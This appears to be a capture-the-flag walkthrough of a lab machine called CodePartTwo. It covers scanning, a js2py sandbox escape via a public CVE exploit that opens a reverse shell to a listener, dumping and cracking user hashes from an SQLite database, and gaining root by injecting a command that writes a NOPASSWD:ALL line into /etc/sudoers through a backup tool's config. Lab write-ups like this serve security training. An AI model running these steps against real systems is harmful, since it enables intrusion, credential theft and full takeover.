# CodePartTwo ( linux / js2py_escape / web_config_database / sudo -l / config_file )

# Nmap scan

- First of all scan with nmap .

```bash
nmap -sV -sC 10.129.11.13
```

- Result

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-29 03:42 EET
Nmap scan report for 10.129.11.13 (10.129.11.13)
Host is up (0.065s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Welcome to CodePartTwo
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.41 seconds                                                      
```

# Dirbscan

- Since there is http port we use dirbscan to get directories .

```bash
dirsearch -u http://10.129.11.13:8000 -x 404 
```

- Result

```bash
Output File: /home/abdelrhman/reports/http_10.129.11.13_8000/_26-01-29_03-46-54.txt

Target: http://10.129.11.13:8000/

[03:46:54] Starting:                                                                                                                                                       
[03:47:29] 302 -  199B  - /dashboard  ->  /login                            
[03:47:32] 200 -   10KB - /download                                         
[03:47:45] 200 -  667B  - /login                                            
[03:47:46] 302 -  189B  - /logout  ->  /   
```

# Web and getting initial shell

- After opening web page notice code input area which use `/run_code` endpoint .

```bash
└─$ curl -X POST http://10.129.11.13:8000/run_code -H "Content-Type: application/json" -d '{"code": "var x = 5 + 5; x"}'
{"result":10}
```

- After searching we found it uses `js2py` at `http://10.129.11.13:8000/run_code` which is vulnerable to https://github.com/naclapor/CVE-2024-28397/.
- Download then use exploit as described .

```bash
nc -lvnp 8888 
```

```bash
python3 exploit.py --target http://10.129.11.136:8000/run_code --lhost 10.10.14.205 --lport 8888
```

- Upgrade shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

# Getting user shell

- After some search we found `users.db`  in instance folder .

![image.png](CodePartTwo%20(%20linux%20js2py_escape%20web_config_databa/image.png)

- Enumerate tables .

```bash
app@codeparttwo:~/app/instance$ sqlite3 users.db ".tables"
sqlite3 users.db ".tables"
code_snippet  user 
```

- Dump users

```bash
app@codeparttwo:~/app/instance$ sqlite3 users.db "SELECT * FROM user;"
sqlite3 users.db "SELECT * FROM user;"
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
```

- After cracking .

```bash
sweetangelbabylove
```

![image.png](CodePartTwo%20(%20linux%20js2py_escape%20web_config_databa/image%201.png)

- Now we can just use them to login using ssh or simply use `su` .

```bash
su marco
ssh marco@10.129.11.136
```

- Get `user.txt` .

```bash
marco@codeparttwo:~$ cat user.txt
cat user.txt
a02700fa1e3e8843974152cd435b45d9
```

# Getting root

- Run `sudo -l` .

```bash
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

- After running this we notice it take config file and path of config file .

```bash
sudo /usr/local/bin/npbackup-cli  -h
```

- The path is `/home/marco/npbackup.conf`

```bash
  -c CONFIG_FILE, --config-file CONFIG_FILE
                        Path to alternative configuration file (defaults to current dir/npbackup.conf)
```

- Now we copy config file to /tmp and modify it to get shell

```bash
cp ~/npbackup.conf /tmp/mod.conf
```

- Open config file notice this in config file which execute commands .

```bash
backup_opts:
  pre_exec_commands: []
```

- Since we can run npbackup as root it’s executed command are also root .
- We add this command to get all privileges inside  `pre_exec_commands: []`.

```bash
'echo "marco ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
```

- This add us to `sudoers` file with all privilege .
- Run npbackup with modified config .

```bash
 sudo /usr/local/bin/npbackup-cli  -c /tmp/mod.conf  --backup

```

- Check if it worked and notice `(ALL) NOPASSWD: ALL`

```bash
marco@codeparttwo:/tmp$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
    (ALL) NOPASSWD: ALL
```

- Now just type `sudo -i` and get flag .

```bash
marco@codeparttwo:/tmp$ sudo -i
root@codeparttwo:~# cat /root/root.txt
fc15060ea343186abd075822c704159e
```